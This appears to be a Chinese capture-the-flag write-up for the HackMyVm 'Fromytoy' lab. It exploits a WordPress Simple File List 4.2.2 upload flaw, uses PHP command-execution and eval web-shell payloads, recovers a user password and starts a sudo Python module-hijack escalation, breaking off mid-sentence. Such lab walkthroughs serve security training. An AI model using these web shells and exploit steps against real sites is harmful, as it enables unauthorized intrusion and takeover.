---
title: HackMyVm靶场之Fromytoy
url: https://mp.weixin.qq.com/s/j-dTaJ5YPWxMC25Ev2uFeQ
source: Doonsec's feed
date: 2026-03-21
fetch_date: 2026-03-22T04:16:49.691111
---

# HackMyVm靶场之Fromytoy

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8avkpGSKmqeSWWx14dPVBK8WHQ9BqdkUFNKcqHibSuxBSl5nibWicz9w2glAnxT3asGmSrIDrQiaJVVUX4bwmjaBfd0E6fiaCJaveantIShmDniao/0?wx_fmt=jpeg)

# HackMyVm靶场之Fromytoy

原创

MS02423
MS02423

MS02423

![]()

在小说阅读器中沉浸阅读

好长时间没有更新wp了，把拉下的wp写一写

这个靶机是群友的靶机，wp之前就写过了，最近太懒了，不想再写一遍，所以我就直接复制粘贴之前的wp了，图片可能看的有点模糊![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_1@2x.png)。

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcJTXpTwQ9jmbojXzy9cs8c3Ribtg5a6AUeeibsicb95Ycywl73b8j6HF9g1SyYAOLcoaaWlq4gPrRXxYjWiapCYvvb6Zdmu5346zQ/640?wx_fmt=png&from=appmsg)

1.探测 IP

```
 nmap -sP 192.168.137.0/24
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfV1CkgPGqHouyUc5SxEnTB0uOtZp4Y7O9TTuwq794nPCpDlLQuYhkMJAYBerbTfPtdiaceQIj8Alte3AnriaIGHldwKfyGv7oQA/640?wx_fmt=png&from=appmsg)

靶机 IP 是 192.168.137.201

2.扫描 IP

1)扫描端口

```
nmap -p- -sV 192.168.137.201
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcbpW4AichicTqsviaEoA3GOntfoYMt3zFdNbHCjKrJl1IONh24vTJmGGxABGgRsdxpWsXCb1ib81S2cic7xuniamjaaNg0ZDK4qX9fw/640?wx_fmt=png&from=appmsg)

端口开启了 22,80,3000 端口，那么我们大概的思路就是在 80 和 3000

端口发现信息，然后在 22 端口进行端口，我侧重于 3000 端口

```
gobuster dir -u http://192.168.137.201 -w  /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfJ97oGib0KKJyUuY5AibODOlFKvpWuybz5LhxogP7a2eSAWicOXZlGyvwuzj25WYdJvle7bicNfcQxzlI8hKHAo6kDFdj3H9WKC1o/640?wx_fmt=png&from=appmsg)

我们在 80 端口没有发现任何信息

我们去扫描 3000 端口试试看

```
gobuster dir -u http://192.168.137.201:3000 -w  /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqf5TkxBtLUtHHu83V1TphEYrrQjZhNn90HK1ykBzELGhX5I7vE3BE7jm1uwrzDibHTp3YbWpRJyD1Wjuic9S7yPbibBNn3WpB3TK8/640?wx_fmt=png&from=appmsg)

我们扫描到一个登录页面，我们去查看

```
http://192.168.137.201:3000/wp-login.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqeFibEmhY1sjZ7bCHicPvO8j5Lm7Hl1Gobt0tCXibt4nfMGeyFccfpPDTjol2fXOtgWC8ziatAuaicKDAogydicRMZfppdphzyVMdVpw/640?wx_fmt=png&from=appmsg)

可以看到是 wordpress，看到这个我们首先想到的是爆破用户名和密码，登录进去就是一个文件上传或者是一个 404 页面(但是这里我们使用的不是登录页面)，因为密码爆破不出来。

3.访问 IP

我们访问 80 端口

```
http://192.168.137.201/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfYD5R0g9DdXqXSk3T65WDo3BI0hiaibatGaUnrgwbQWaT2RPet9umypJ3aOzDvPIqibAKddLibibskRMgiaFhqmLT8tF9oCgC3ibfla4/640?wx_fmt=png&from=appmsg)

没有用

访问 3000 端口

```
http://192.168.137.201:3000/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcHR6ssGOs9Y0C29sqkA5wA3sNVl8alGiaibNvr9sojRmmFLQNgF5wr4DkFfgGy0IDT6TExeZn269FN1UmSrj4uLkjYkKcnOocs8/640?wx_fmt=png&from=appmsg)

我们在最下面发现了/wp-content/plugins/simple-file-list/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeWCXZ0vlNUKoPibpb7wNmBZ1icPr3OcRegyjn2mib2licd3bGoTMicLm3ic1rG2wNYtliaBib8p8XlMLn9n8dva7VOorzJxaulzaZib1Kc/640?wx_fmt=png&from=appmsg)

```
http://192.168.137.201:3000/wp-content/plugins/simple-file-list/readme.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqejmA7axLVhgBZV3FicYFvktTfkh9dY61SAOMr7Ekfia85j8Q5LicJP6arx6Whwp1eVEOG5TNJK7onsLhFpBLBKHnwkUNR0EKdG2Y/640?wx_fmt=png&from=appmsg)

版本号是 4.2.2,感觉是一个利用点，我们去搜索试试看

4.渗透测试

1)搜索漏洞点

我们使用 kali 自带的漏洞库进行搜索

```
 searchsploit simple file list 4.2.2
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfTrnhk9GDdiaWFTprGKnUM3nZKsGAUkqEyPROVjzc2ZpIUaEUsTP5qC9BhIWoNRkmv13vQwialIDq3PwuwnXH4SRAsGWlXIcp9Q/640?wx_fmt=png&from=appmsg)

我们可以看到有 poc,这里我们使用第二个

2)利用漏洞点

我们查看48979.py脚本,我们需要修改的地方只有一个payload即可

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdVAib6gdD1HEJsHRBUpOcQsCoIMFOaJ0a5l6p36jWNmY6Lia61WCmd81u8wIC9KqqHuweTibDpiapROWL1xDwKqrxI3DmsUg7vUng/640?wx_fmt=png&from=appmsg)

我修改的是命令执行'<?php system($\_GET["cmd"]); ?>'

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqeFpEKBz8sYTYiaz7p4CCvdibms3HZXnPXbZr94dqD95hdFPqXDGh8FfKaSbW7pCcpnk4gy1HRz4Ln1PVnT1nzicibEz4POdEc4Lv4/640?wx_fmt=png&from=appmsg)

然后执行脚本即可

```
sudo python3 48979.py http://192.168.137.201:3000
```

记得一定要使用 sudo 去执行，不然的话是会报错的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeJdYUkOITBmm2RmS4ePgRQkKFPlRTfAaoGkN7fxXd82EBGNQVFzU8z0SwjMAGLbicicINup1ciaEgmV6rWS0icDa7Uy0C2sPiar87E/640?wx_fmt=png&from=appmsg)

我们去查看这个 url 即可

3)验证漏洞

```
http://192.168.137.201:3000/wp-content/uploads/simple-file-list/7805.php?cmd=id;
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdulrVtqTmYHTfkbTpdsXD4QDM647cy3jLWTKz1OkZhoMcEKdTWakdYg8sU9fibDs3ZHfyfMPF10GzQIUbZ5oOVvTzduYl6ohd8/640?wx_fmt=png&from=appmsg)

可以看到是利用成功的，那么我们直接反弹 shell 即可

4)连接蚁剑

这里我们 nc 和 busybox 都是使用不了的，我们去写入一个一句话木马，然后去连接蚁剑

```
http://192.168.137.201:3000/wp-content/uploads/simple-filelist/7805.php/?cmd=echo%20%3C?php%20@eval($_POST[%27cmd%27]);?%3E%20%3E%3E1.php
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdOeGW5icMjtylPlt7m1O0S7adMAYY7ib50BesoliagmyMkN5mCy6ias2rT4iabuLFyYtBRLEXNm23aJLRgyN2hXTnIADUQYM7J9utE/640?wx_fmt=png&from=appmsg)

我们连接已经蚁剑连接成功

5)切换用户

我们现在拿到的用户是 www-data，权限太低了，什么都干不了

我们去看看有哪些用户

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdhnK80iaibLmhXrymSa0siax8h2NLra4myaGQCTMTzXBWw6RiciaBc99urNstc67aPyibRmj1BGxGIuZsSvGiauMQsgNGq14hd0mcqqk/640?wx_fmt=png&from=appmsg)

可以看到一个 miku 用户,所以我们需要去登录到 miku 用户里面

我们去看看有哪些文件是 miku 用户的

```
find / -user miku 2>/dev/null
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcThGynFichicK4JhhibJrRV7OOf0MHNx3EqUTe7iaia4RRrYOEZ6DODOxkticYUvWAe0s0sjB3IuDI4OKic9anRKwv1UOd5zicOtdiclQ8/640?wx_fmt=png&from=appmsg)

可以看到 2 个文件，我们首先看看这个 /usr/local/lib/.sys\_log\_rotator，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdcYibc0LjtQCL7Ia3xJ7YvCk3pMKgE0Gft4XG1ibIoU8ZkP9wlM9SsGNrHz6ZzvFvScZ39Jrwjkhs3yp0zzmrD9IRV0fFqtianTM/640?wx_fmt=png&from=appmsg)

```
strings /usr/local/lib/.sys_log_rotator
```

```
Cat /var/www/html/wp-content/uploads/server_backup_info.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdpgvVKTzWicXNT6fh2p1LVqBzCcfqrRcDaF3Ecqf9lQnoshQEtmMyZsSlmXa7A2YChBjE4GTWaYSicxmgiaKlvaXAiawCUXvxHt1o/640?wx_fmt=png&from=appmsg)

我们直接查看的话，告诉我们是没有权限的。

我们使用 rev 去读取这个文件

```
/usr/local/lib/.sys_log_rotator //var/www/html/wp-content/uploads/server_backup_info.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdILEZ8v5WxHWkuxkI8WVPS73f0hTxd1Za5FcrUTk1bcicUFBGJkOXaJlHroIFzuNU2dIMrL95ZVMRAKsaugGOgdnGXDqlDXo0g/640?wx_fmt=png&from=appmsg)

我们可以看到一些内容，我们给 ai 即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdCD5Glaoib1Z0M0zwkIodOku3vwR2KOv9FLwoPeTCgjh5oB13ibtmsUOpgm1VW6D4oaPRKicyPbJOic2CFY4AUKlpp4OkWFYeBB5o/640?wx_fmt=png&from=appmsg)

告诉我们用户名: miku，密码: V0cal0id\_M1ku\_39

6)登录 miku 用户

ssh miku@192.168.137.164

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqemaxUdNj1o0YdxN9waOxey3DovibgmVKVK0FtfjzUWojbZdZHlekzRKhCVZltarhicsPvhRKazmesfIcbV4S9jL9JaJAOlZ1ZQI/640?wx_fmt=png&from=appmsg)

我们可以看到登录成功，直接读取 user.txt 即可

7)查看脚本

首先，我们使用 sudo -l 去查看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeOlgqSG9r6jqkk5h1DFw3jjOYDl2sGkF2rJ6BR0G3RxNmE7DcTlSQOJtqB0kfbUeBwoPUtMIgr6cXGAIxeiaCoEnKDlWTs9UBU/640?wx_fmt=png&from=appmsg)

可以看到任何用户都可以无密码执行

/usr/local/lib/python\_scripts/cleanup\_task.py 脚本

我们查看这个脚本

```
/usr/local/lib/python_scripts/cleanup_task.py#!/usr/bin/env python3import sysimport osimport system_utils  def main(): print("[*] Starting system cleanup...") if os.geteuid() != 0: print("[-] Error: This script must be run as root.") sys.exit(1) system_utils.check_disk_space() print("[+] Cleanup completed successfully.")if __name__ == "__main__": main()
```

这个脚本调用 system\_utils 模块中的 check\_disk\_space 函数检查

磁盘使用情况

当我们运行脚本，就可以看到磁盘的使用情况

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdXOm1gMFb6MVXmGAWNzQIicC4giauia4HL3NzYfkY3w4K8GmYaUGNkMiaRX2Th5mwHeropsKp57Rc2bAlbf1P151bWzjyF4iaibCuas/640?wx_fmt=png&from=appmsg)

我们去查看这个 system\_utils 这个脚本

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqf6KMic0D3uC2rFc1PicSiciaSMwBDvfq4k8hfxCHKxUn0ia3k44zwyowcFznPKiaBBtiaSgJaq78HHEh4hVtibdg2wxCMy6ibnd0AiaYb8M/640?wx_fmt=png&from=appmsg)

我们可以看到里面的内容是查看磁盘的目录，那么我们就需要把里面

的内容修改成提权的命令即可

我们不能直接去修改的，因为我们没有修改的权限，但是我们可以看...